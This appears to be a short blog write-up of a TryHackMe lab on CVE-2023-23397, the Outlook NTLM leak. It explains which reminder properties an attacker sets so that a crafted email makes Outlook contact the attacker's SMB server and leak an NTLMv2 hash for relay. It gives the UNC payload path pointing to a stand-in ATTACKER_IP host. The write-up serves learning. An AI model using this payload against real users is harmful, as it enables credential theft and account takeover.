---
layout: post
title: "Outlook NTLM Leak"
date: 2023-06-04 
categories: ["Hands-on", "TryHackMe"]
tags: "TryHackMe","CVE-2023-23397"
---

# Outlook NTLM Leak
## CVE-2023-23397

**Scenario:**
*The victim recieves a malicous email that redirects them to the attacker's SMB Server. This happens by busing CVE-2023-23397.*

The exploit happens by manipulating the parameter of the reminder sound path location. Simply changing the path wont do anything. the **PidLidReminderFileParameter** should point to **Universal Naming Convention (UNC)** path instead of a local file. **PidLidReminderOverride** should be configured to true to be able to override the default the confirgurations.

When the Victim connects to the attacker's SMB server, the victim's remote server would send the NTLM. The attacker can use the NTLMv2 hash to authenticate by using the relay attack. 

```bash
\\ATTACKER_IP\foo\bar.wav
```

 

